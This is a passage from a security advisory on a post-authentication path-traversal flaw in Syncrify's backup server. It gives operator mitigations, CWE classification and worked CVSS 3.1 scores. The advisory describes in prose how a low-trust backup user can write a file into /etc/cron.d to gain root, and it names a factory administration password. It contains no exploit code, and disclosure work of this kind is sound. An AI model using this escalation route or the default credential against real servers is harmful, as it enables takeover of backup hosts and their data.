   outside the repository subtree. A test written against the class catches the next instance, which
   a test written against this path does not.

### Fix Recommendations — operator-side, until a patch exists

1. **Treat every backup-user credential as a potential root write on the server.** Provision them
   narrowly, rotate them, and review the backup-user store for accounts with no corresponding client.
2. **Do not expose the administration portal to untrusted networks.** Bind the listener to an
   internal interface or place it behind an authenticating reverse proxy on a management segment.
   This reduces exposure for the whole HTTP surface, including this route.
3. **Run the service unprivileged if the deployment permits it.** A dedicated account with write
   access confined to the repository subtree removes the escalation path demonstrated here. Verify
   that repository ownership and any client-side data the server must read still work before
   committing to this.
4. **Put filesystem integrity monitoring on the scheduler and service paths**: `/etc/cron.d`,
   `/etc/crontab`, `/var/spool/cron`, the init system's unit directories, and the service's own
   binary, library and configuration directories. Alert on creation and on any job line naming
   `root`.
5. **Audit the PublicLinks tree** for content that does not correspond to shared folders, and for
   per-user folders created by accounts that never used the sharing feature.
6. **Monitor the backup-user authentication path** for successful authentications followed by one or
   two small chunk uploads and no further protocol activity, which is not the shape of a real backup
   session.
7. **Keep a supported restore tested.** The most damaging use of root on a backup server is against
   the recoverability of the data it holds. An offline or immutable copy of critical repositories,
   outside the server's own write reach, is the control that survives a full compromise of this host.

## 12. CWE and CVSS

### CWE and CVSS — classification

- **Primary: CWE-22**, improper limitation of a pathname to a restricted directory. The filename
  field is used to build a path with no restriction to the intended directory, and the resulting
  write is the defect.
- **Contributing: CWE-269**, improper privilege management. The service identity is root with no
  separation between the backup service and the host's root-scheduled job authority, which is what
  converts a file write into root execution. This is a condition of the deployment shape, not of the
  code path, and it is listed as contributing for that reason.
- **Contributing: CWE-78**, OS command injection, in the sense that the content written to a
  scheduler directory is interpreted as a command line by a shell running as root. We are explicit
  that this is the mechanism of escalation and not a defect in the application: no command line is
  constructed inside Syncrify, and every execution site in the product uses an argument vector with
  no shell.
- **Not claimed: CWE-798.** The factory administration password is a deployment-dependent fact that
  expires on first use, it belongs to a different user store than the one gating this sink, and it is
  used nowhere in this scoring.
- **Not claimed: CWE-306 or CWE-287.** The authentication gate on this route is present and correct;
  it was examined from several directions and was not bypassed. The finding is post-authentication.

### CWE and CVSS — vector derivation

Published primary vector: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` = **7.5 High**.

| Metric | Value | Reason |
|---|---|---|
| Attack Vector | Network (N) | The vulnerable component is an HTTP handler on a network-bound servlet connector, reached by URL over TCP. The credential it accepts exists so remote client machines can use it. Deployment-dependent exposure of that listener is priced in Attack Complexity, not by downgrading this metric. |
| Attack Complexity | High (H) | Two conditions outside the attacker's control: the listener carrying this route must be reachable from the attacker's position (loopback-only in our instance because we configured it that way; the shipped binding is not established by any artifact), and the host must run a scheduler that scans `/etc/cron.d`. |
| Privileges Required | Low (L) | The least privileged principal proven sufficient is an authenticated backup user - the product's lowest-trust account type. No administrator session is involved, and the factory administration password plays no part in this figure. |
| User Interaction | None (N) | The authenticated principal drives every step itself; no third party acts. |
| Scope | Unchanged (U) | See the Scope decision below. |
| Confidentiality | High (H) | Root on the server: every stored repository, the server's configuration and credential material, and the host's own files are readable. |
| Integrity | High (H) | Arbitrary file write plus root execution: repositories, configuration, scheduler state, service binaries and host state are all modifiable. |
| Availability | High (H) | The service, the host and the backup data can be stopped, corrupted or deleted. |

Arithmetic, shown so that any reader can reproduce it with the CVSS 3.1 base algorithm and the
round-up-to-the-nearest-tenth rule:

```text
ISS           = 1 - ((1-0.56) x (1-0.56) x (1-0.56))
              = 1 - (0.44 x 0.44 x 0.44)
              = 1 - 0.085184                = 0.914816

Impact (S:U)  = 6.42 x ISS
              = 6.42 x 0.914816             = 5.873119

Exploitability = 8.22 x AV(0.85) x AC(0.44) x PR(0.62) x UI(0.85)
              = 8.22 x 0.85 x 0.44 x 0.62 x 0.85
                                          = 1.620146

Base (S:U)    = Roundup(Impact + Exploitability)
              = Roundup(5.873119 + 1.620146)
              = Roundup(7.493265)           = 7.5   -> High
```

Conditional reading, published as conditional and carrying its own complete vector: where the
listener carrying `/app?operation=` is reachable from the attacker's network position - the normal
operating mode for a backup server whose clients push data to it remotely - and the host runs a
scheduler, attack complexity drops to Low and every other metric is unchanged:
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8 High**.

```text
Exploitability = 8.22 x 0.85 x 0.77 x 0.62 x 0.85
                                          = 2.835255
Base (S:U)    = Roundup(5.873119 + 2.835255)
              = Roundup(8.708374)           = 8.8   -> High
```

This conditional figure is a deployment-posture reading. It is not the headline, it is not what we
observed on our instance, and a reader whose deployment keeps the portal on a management network
should read the 7.5 instead.

### CWE and CVSS — the Scope decision

Scope is Unchanged, and the argument is about identity rather than about process count.

The vulnerable component is Syncrify's PublicLink handler. The outcome is command execution on the
same host, with the same effective identity the server process already holds - uid 0. The server
process is root over this host by construction of the deployment, so the compromised scheduler and
the compromised server sit inside one authority domain: nothing is gained that the vulnerable
component did not already control. A cross-component reading would be appropriate where the outcome
reached a different trust domain - a different machine, a hypervisor, a container host from inside a
container, or a privilege level the service identity did not already hold. None of those is the case
here.

The privilege gain in this finding is real and substantial, and it is expressed by the metrics that
are meant to carry it: `PR:L` records that a low-trust principal suffices, and `C:H/I:H/A:H` record
the totality of what root on this host controls. Scope is not the vehicle for expressing privilege
distance, and using it that way would double-count the same fact.

The rejected changed-scope variant is published with its arithmetic, so that a reader who disagrees
with the Scope call can see exactly what it is worth rather than having to take our word for it:

```text
Impact (S:C)  = 7.52 x (0.914816 - 0.029)
                - 3.25 x (0.914816 x 0.9731 - 0.02)^13
              = 6.661336 - 0.533310         = 6.128026

Exploitability = 8.22 x 0.85 x 0.44 x PR(S:C, L = 0.68) x 0.85
                                          = 1.776934

Base (S:C)    = Roundup(1.08 x (6.128026 + 1.776934))
              = Roundup(1.08 x 7.904960)
              = Roundup(8.537357)           = 8.6   -> High
```

So the changed-scope reading of the same metrics is 8.6 rather than 7.5. We publish 7.5, and the
rejection is on the identity argument above, not because the alternative computes lower.

### CWE and CVSS — what is deliberately not published

- **No unauthenticated score.** Nothing in this advisory is rated `PR:N`. The gate was examined and
  held, and an unauthenticated reading is not offered as a hypothetical.
- **No score built on the factory administration password.** The `letmein` credential, its forced
  change on first login, the globally disabled CSRF prevention, the vendor-default credentials for a
  disabled embedded database, and the default trial licence serial are all facts we hold. None of
  them is folded into the vector, none of them raises a metric, and no conditional reading in this
  advisory assumes an unrotated factory credential.
- **No claim that root execution or an active scheduler is universal.** Both were observed in the
  deployment shape we tested. Where an operator has separated privileges or removed the scheduler,
  the escalation demonstrated here does not follow, and the arithmetic above is not the correct
  description of that deployment.
- **The loopback-as-default reading is published and rejected.** If a reader treats our loopback
  binding as the shipped default, the honest vector is
  `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **7.8 High**:

```text
Exploitability = 8.22 x AV(L = 0.55) x 0.77 x 0.62 x 0.85
                                          = 1.834577
Base (S:U)    = Roundup(5.873119 + 1.834577)
              = Roundup(7.707696)           = 7.8   -> High
```

  It is rejected because the binding is not artifact-established as a product default, and note that
  it computes *higher* than the figure we publish, not lower. Choosing `AV:N` with `AC:H` is the
  conservative reading on this finding, and a reader who disagrees about the default ends up with a
  larger number, not a smaller one.
- **No version-range claim.** Only 6.2 build 1178 was decompiled and exercised.

### CWE and CVSS — summary

Path traversal (CWE-22) in a client-protocol upload branch, reachable by the product's lowest-trust
account type, producing an arbitrary file write that a root-privileged service identity and an active
host scheduler turn into root command execution.

- Published as **7.5 High** on `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`.
- Labelled conditional reading of **8.8 High** on `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, for a deployment in which the listener carrying the route is reachable from the attacker's position.

---
*0day Rubbish Research Team - disclosure@0day-rubbish.com*
